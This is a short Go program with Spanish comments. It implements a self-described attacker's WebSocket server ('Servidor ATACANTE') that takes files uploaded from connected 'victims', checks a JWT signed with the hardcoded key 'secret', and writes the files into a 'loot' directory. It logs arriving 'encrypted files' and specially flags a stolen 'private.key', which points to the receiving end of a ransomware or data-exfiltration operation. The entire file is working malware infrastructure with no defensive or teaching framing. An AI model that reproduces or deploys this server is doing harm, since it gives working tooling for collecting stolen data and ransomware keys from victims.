package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	// "strings" eliminada porque no se usa

	"github.com/golang-jwt/jwt"
	"github.com/gorilla/websocket"
)

var mySigningKey = []byte("secret") // Clave secreta para validar tokens

// Estructura de los datos que recibiremos
type TokenPayload struct {
	Token string `json:"token"`
	Data  []byte `json:"data"`
	Name  string `json:"name"`
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true // Acepta conexiones de cualquier origen
	},
}

// Crear carpeta para guardar lo robado
func createLootDirectory() string {
	lootDir := "loot"
	if _, err := os.Stat(lootDir); os.IsNotExist(err) {
		os.Mkdir(lootDir, 0755)
	}
	return lootDir
}

// Validar que el token del cliente es correcto
func ValidateToken(tokenString string) (bool, error) {
	token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("metodo de firma inesperado")
		}
		return mySigningKey, nil
	})
	if err != nil {
		return false, err
	}
	return token.Valid, nil
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	// Actualizar conexión HTTP a WebSocket
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Error al actualizar conexión:", err)
		return
	}
	defer conn.Close()

	log.Println("Nueva víctima conectada.")
	lootDir := createLootDirectory()

	for {
		var payload TokenPayload
		// Leer mensaje JSON del cliente
		err := conn.ReadJSON(&payload)
		if err != nil {
			log.Println("Desconexión o error de lectura:", err)
			break
		}

		// Validar el token
		valid, _ := ValidateToken(payload.Token)
		if !valid {
			log.Println("Token inválido, rechazando datos.")
			continue
		}

		// Guardar el archivo recibido
		filePath := filepath.Join(lootDir, filepath.Base(payload.Name))
		
		if payload.Name == "private.key" {
			log.Println("¡CLAVE PRIVADA RECIBIDA! Guardando en:", filePath)
		} else {
			log.Println("Archivo cifrado recibido:", payload.Name)
		}

		err = ioutil.WriteFile(filePath, payload.Data, 0644)
		if err != nil {
			log.Println("Error guardando archivo:", err)
		}
	}
}

func main() {
	http.HandleFunc("/ws", handleConnection)
	port := "8080"
	fmt.Println("Servidor ATACANTE escuchando en el puerto", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}
